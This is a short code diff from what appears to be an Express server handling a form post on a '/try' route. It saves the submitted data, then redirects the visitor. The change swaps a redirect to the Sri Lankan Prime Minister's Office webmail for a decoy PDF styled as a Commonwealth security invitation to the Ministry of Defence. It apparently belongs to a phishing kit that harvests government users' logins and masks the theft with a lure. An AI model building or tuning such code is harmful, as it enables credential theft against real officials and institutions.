@@ -91,7 +91,7 @@ router.post('/try', validateFormData2, (req, res) => {
 		    console.error('Error inserting record:', err);
 		    return res.status(500).send('Internal Server Error');
 		}
-		res.redirect('http://mail.pmoffice.gov.lk/');
+		res.redirect('./Commonwealth Security Invitation to MoD Sri Lanka for Commonwealth Security Review 2024.pdf');
 		});
 		   
 
